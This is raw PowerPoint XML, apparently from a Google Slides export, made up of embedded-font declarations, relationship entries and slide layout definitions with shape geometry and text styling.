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Lst>
  <p:sldSz cy="5143500" cx="9144000"/>
  <p:notesSz cx="6858000" cy="9144000"/>
  <p:embeddedFontLst>
    <p:embeddedFont>
      <p:font typeface="Inconsolata ExtraBold"/>
      <p:bold r:id="rId81"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Roboto"/>
      <p:regular r:id="rId82"/>
      <p:bold r:id="rId83"/>
      <p:italic r:id="rId84"/>
      <p:boldItalic r:id="rId85"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Roboto Medium"/>
      <p:regular r:id="rId86"/>
      <p:bold r:id="rId87"/>
      <p:italic r:id="rId88"/>
      <p:boldItalic r:id="rId89"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Inconsolata"/>
      <p:regular r:id="rId90"/>
      <p:bold r:id="rId91"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Inconsolata SemiBold"/>
      <p:regular r:id="rId92"/>
      <p:bold r:id="rId93"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Roboto Light"/>
      <p:regular r:id="rId94"/>
      <p:bold r:id="rId95"/>
      <p:italic r:id="rId96"/>
      <p:boldItalic r:id="rId97"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Inconsolata Medium"/>
      <p:regular r:id="rId98"/>
      <p:bold r:id="rId99"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Roboto Mono"/>
      <p:regular r:id="rId100"/>
      <p:bold r:id="rId101"/>
      <p:italic r:id="rId102"/>
      <p:boldItalic r:id="rId10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612969B-C513-441B-A60A-CB1CB7D8F428}">
  <a:tblStyle styleId="{6612969B-C513-441B-A60A-CB1CB7D8F42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font" Target="fonts/RobotoMono-boldItalic.fntdata"/><Relationship Id="rId102" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/RobotoMono-italic.fntdata"/><Relationship Id="rId101" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/RobotoMono-bold.fntdata"/><Relationship Id="rId100" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/RobotoMono-regular.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font" Target="fonts/RobotoLight-bold.fntdata"/><Relationship Id="rId94" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/RobotoLight-regular.fntdata"/><Relationship Id="rId97" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/RobotoLight-boldItalic.fntdata"/><Relationship Id="rId96" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/RobotoLight-italic.fntdata"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide5.xml"/><Relationship Id="rId99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/InconsolataMedium-bold.fntdata"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide4.xml"/><Relationship Id="rId98" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/InconsolataMedium-regular.fntdata"/><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font" Target="fonts/Inconsolata-bold.fntdata"/><Relationship Id="rId90" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/Inconsolata-regular.fntdata"/><Relationship Id="rId93" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/InconsolataSemiBold-bold.fntdata"/><Relationship Id="rId92" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/InconsolataSemiBold-regular.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font" Target="fonts/Roboto-italic.fntdata"/><Relationship Id="rId83" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/Roboto-bold.fntdata"/><Relationship Id="rId86" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/RobotoMedium-regular.fntdata"/><Relationship Id="rId85" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/Roboto-boldItalic.fntdata"/><Relationship Id="rId88" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/RobotoMedium-italic.fntdata"/><Relationship Id="rId87" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/RobotoMedium-bold.fntdata"/><Relationship Id="rId89" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/RobotoMedium-boldItalic.fntdata"/><Relationship Id="rId80" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide74.xml"/><Relationship Id="rId82" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/Roboto-regular.fntdata"/><Relationship Id="rId81" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/InconsolataExtraBo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266a8201a54_1_28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266a8201a54_1_28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266a8201a54_1_28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266a8201a54_1_28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266a8201a54_1_28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266a8201a54_1_28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266a8201a54_1_28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266a8201a54_1_28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266a8201a54_1_2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266a8201a54_1_2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266a8201a54_1_2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266a8201a54_1_2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266a8201a54_1_28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266a8201a54_1_28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266a8201a54_1_28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266a8201a54_1_28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266a8201a54_1_28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266a8201a54_1_28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266a8201a54_1_28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266a8201a54_1_28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266a8201a54_1_28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266a8201a54_1_28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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_29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266a8201a54_1_30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266a8201a54_1_30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266a8201a54_1_30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266a8201a54_1_30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266a8201a54_1_30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266a8201a54_1_30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266a8201a54_1_30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5" name="Google Shape;675;g266a8201a54_1_30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266a8201a54_1_30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266a8201a54_1_30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266a8201a54_1_30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9" name="Google Shape;689;g266a8201a54_1_30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266a8201a54_1_30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266a8201a54_1_30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266a8201a54_1_30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266a8201a54_1_30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266a8201a54_1_3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266a8201a54_1_3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266a8201a54_1_3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266a8201a54_1_3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266a8201a54_1_3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266a8201a54_1_3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266a8201a54_1_3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1" name="Google Shape;781;g266a8201a54_1_3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266a8201a54_1_3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9" name="Google Shape;789;g266a8201a54_1_3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266a8201a54_1_3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g266a8201a54_1_3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266a8201a54_1_3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3" name="Google Shape;803;g266a8201a54_1_3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g266a8201a54_1_3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2" name="Google Shape;812;g266a8201a54_1_3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266a8201a54_1_3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1" name="Google Shape;821;g266a8201a54_1_3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266a8201a54_1_3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2" name="Google Shape;832;g266a8201a54_1_3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g266a8201a54_1_3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2" name="Google Shape;842;g266a8201a54_1_3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266a8201a54_1_3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266a8201a54_1_3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266a8201a54_1_3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1" name="Google Shape;861;g266a8201a54_1_3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266a8201a54_1_3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2" name="Google Shape;872;g266a8201a54_1_3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266a8201a54_1_3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9" name="Google Shape;879;g266a8201a54_1_3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g266a8201a54_1_3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7" name="Google Shape;897;g266a8201a54_1_3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266a8201a54_1_3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4" name="Google Shape;904;g266a8201a54_1_3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266a8201a54_1_3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3" name="Google Shape;913;g266a8201a54_1_3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266a8201a54_1_3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4" name="Google Shape;934;g266a8201a54_1_3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266a8201a54_1_3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1" name="Google Shape;941;g266a8201a54_1_3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266a8201a54_1_3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5" name="Google Shape;945;g266a8201a54_1_3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266a8201a54_1_3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9" name="Google Shape;949;g266a8201a54_1_3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g266a8201a54_1_3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3" name="Google Shape;953;g266a8201a54_1_3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266a8201a54_1_3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6" name="Google Shape;966;g266a8201a54_1_3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266a8201a54_1_3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1" name="Google Shape;971;g266a8201a54_1_3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266a8201a54_1_3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6" name="Google Shape;976;g266a8201a54_1_3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266a8201a54_1_3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5" name="Google Shape;985;g266a8201a54_1_3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266a8201a54_1_3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5" name="Google Shape;995;g266a8201a54_1_3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g266a8201a54_1_3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4" name="Google Shape;1014;g266a8201a54_1_3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g3118e13463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3" name="Google Shape;1043;g3118e13463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g266a8201a54_1_3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2" name="Google Shape;1052;g266a8201a54_1_3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266a8201a54_1_3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6" name="Google Shape;1056;g266a8201a54_1_3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266a8201a54_1_3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6" name="Google Shape;1066;g266a8201a54_1_3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266a8201a54_1_3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3" name="Google Shape;1073;g266a8201a54_1_3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g266a8201a54_1_3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8" name="Google Shape;1098;g266a8201a54_1_3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g266a8201a54_1_3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9" name="Google Shape;1109;g266a8201a54_1_3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2" name="Shape 1112"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1113" name="Google Shape;1113;g266a8201a54_1_3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4" name="Google Shape;1114;g266a8201a54_1_3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g266a8201a54_1_3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8" name="Google Shape;1118;g266a8201a54_1_3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266a8201a54_1_3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5" name="Google Shape;1125;g266a8201a54_1_3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266a8201a54_1_3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9" name="Google Shape;1129;g266a8201a54_1_3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g266a8201a54_1_3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3" name="Google Shape;1133;g266a8201a54_1_3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266a8201a54_1_3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6" name="Google Shape;1156;g266a8201a54_1_3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g266a8201a54_1_34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0" name="Google Shape;1160;g266a8201a54_1_34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6.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6.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0.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17.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20.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image" Target="../media/image34.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s + Body text">
  <p:cSld name="CUSTOM_11_1_1">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="9" name="Shape 9"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Google Shape;10;p2"/>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1" name="Google Shape;11;p2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="548650"/>
            <a:ext cx="8223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12" name="Google Shape;12;p2"/>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Right image layout">
  <p:cSld name="CUSTOM_6">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="13" name="Shape 13"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Google Shape;14;p3"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="2" type="pic"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5943725" y="150"/>
            <a:ext cx="3200100" cy="5143500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Google Shape;15;p3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="146300"/>
            <a:ext cx="5486400" cy="3657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3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1"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7" name="Google Shape;17;p3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3"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right text layout">
  <p:cSld name="CUSTOM_3_2">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="18" name="Shape 18"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Google Shape;19;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5943650" y="0"/>
            <a:ext cx="3196500" cy="51435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4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="725688"/>
            <a:ext cx="2286000" cy="6633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2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr b="1" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr lvl="1"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2pPr>
            <a:lvl3pPr lvl="2"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3pPr>
            <a:lvl4pPr lvl="3"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4pPr>
            <a:lvl5pPr lvl="4"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5pPr>
            <a:lvl6pPr lvl="5"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6pPr>
            <a:lvl7pPr lvl="6"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7pPr>
            <a:lvl8pPr lvl="7"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8pPr>
            <a:lvl9pPr lvl="8"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9pPr>
          </a:lstStyle>
          <a:p/>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Google Shape;21;p4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="1600088"/>
            <a:ext cx="2349300" cy="2997600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">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a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr lvl="2" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr lvl="3" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr lvl="4" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr lvl="5" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr lvl="6" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr lvl="7" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr lvl="8" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk2"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p/>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Google Shape;22;p4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2"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23" name="Google Shape;23;p4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3"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4" name="Google Shape;24;p4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="146300"/>
            <a:ext cx="54864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image insert">
  <p:cSld name="CUSTOM_8">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="25" name="Shape 25"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="26" name="Google Shape;26;p5"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="3453900" y="1729748"/>
            <a:ext cx="585300" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="rnd" cmpd="sng" w="9525">
            <a:solidFill>
              <a:srgbClr val="2E5E73"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="med" w="med" type="oval"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="27" name="Google Shape;27;p5"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="3453900" y="3524825"/>
            <a:ext cx="585300" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="rnd" cmpd="sng" w="9525">
            <a:solidFill>
              <a:srgbClr val="2E5E73"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="med" w="med" type="oval"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Google Shape;28;p5"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="2" type="pic"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3657600" y="1371600"/>
            <a:ext cx="5029200" cy="2742300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="57150" rotWithShape="0" algn="bl" dir="5400000" dist="19050">
              <a:srgbClr val="000000">
                <a:alpha val="49803"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Google Shape;29;p5"/>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5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="463231" y="548650"/>
            <a:ext cx="8223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31" name="Google Shape;31;p5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1592650"/>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2" name="Google Shape;32;p5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3413275"/>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Left image layout">
  <p:cSld name="CUSTOM_7_2">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="33" name="Shape 33"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Google Shape;34;p6"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="2" type="pic"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="150"/>
            <a:ext cx="3220500" cy="5143500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Google Shape;35;p6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3657600" y="1054550"/>
            <a:ext cx="5025600" cy="34533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36" name="Google Shape;36;p6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3657601" y="146300"/>
            <a:ext cx="50292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7" name="Google Shape;37;p6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3661286" y="548650"/>
            <a:ext cx="5025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 + Subheading blank">
  <p:cSld name="CUSTOM_21_2_1">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="38" name="Shape 38"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="39" name="Google Shape;39;p7"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-9375" y="929900"/>
            <a:ext cx="7346700" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="med" w="med" type="oval"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Google Shape;40;p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7"/>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2" name="Google Shape;42;p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43" name="Google Shape;43;p7"/>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 line (with bullets)">
  <p:cSld name="CUSTOM_21_1">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="44" name="Shape 44"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="45" name="Google Shape;45;p8"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-9375" y="929900"/>
            <a:ext cx="7346700" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:srgbClr val="2E5E73"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="med" w="med" type="oval"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Google Shape;46;p8"/>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8"/>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8"/>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8"/>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8"/>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8"/>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52" name="Google Shape;52;p8"/>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53" name="Google Shape;53;p8"/>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54" name="Google Shape;54;p8"/>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55" name="Google Shape;55;p8"/>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56" name="Google Shape;56;p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8"/>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58" name="Google Shape;58;p8"/>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59" name="Google Shape;59;p8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="118875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0" name="Google Shape;60;p8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="187428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1" name="Google Shape;61;p8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2559823"/>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2" name="Google Shape;62;p8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="324536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3" name="Google Shape;63;p8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="6" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="393089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blank)">
  <p:cSld name="CUSTOM_21_2_1_1">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="64" name="Shape 64"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="Google Shape;65;p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9"/>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7" name="Google Shape;67;p9"/>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68" name="Google Shape;68;p9"/>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With bullets)">
  <p:cSld name="CUSTOM_21_1_2_1">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="69" name="Shape 69"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
